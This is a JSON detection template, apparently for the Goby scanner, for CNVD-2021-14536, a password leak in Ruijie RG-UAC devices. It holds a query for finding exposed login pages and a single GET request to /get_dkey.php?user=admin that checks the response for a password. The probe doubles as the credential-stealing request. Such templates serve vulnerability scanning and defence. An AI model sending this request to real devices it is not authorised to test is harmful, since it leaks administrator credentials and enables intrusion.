{
      "Name": "Ruijie RG UAC Password leakage CNVD-2021-14536 ruijie-rg-uac",
      "Level": "2",
      "Tags": [
            "infoleak"
      ],
      "GobyQuery": "title=\"RG-UAC登录页面\"",
      "Description": "Ruijie Networks Co., Ltd. is a provider of ICT infrastructure and industry solutions. Its main business is R&D, design and sales of network equipment, network security products and cloud desktop solutions.",
      "Product": "Ruijie RG UAC",
      "Homepage": "https://www.ruijie.com.cn/",
      "Author": "",
      "Impact": "Ruijie RG UAC Password leakage",
      "Recommendation": "http://www.ruijie.com.cn/gy/xw-aqtg-zw/86924/",
      "References": [
            "https://www.cnvd.org.cn/flaw/show/CNVD-2021-14536"
      ],
      "HasExp": false,
      "ExpParams": null,
      "ExpTips": {
            "Type": "",
            "Content": ""
      },
      "ScanSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/get_dkey.php?user=admin",
                        "follow_redirect": true,
                        "header": null,
                        "data_type": "text",
                        "data": ""
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "password",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": []
            }
      ],
      "PostTime": "0000-00-00 00:00:00",
      "GobyVersion": "0.0.0"
}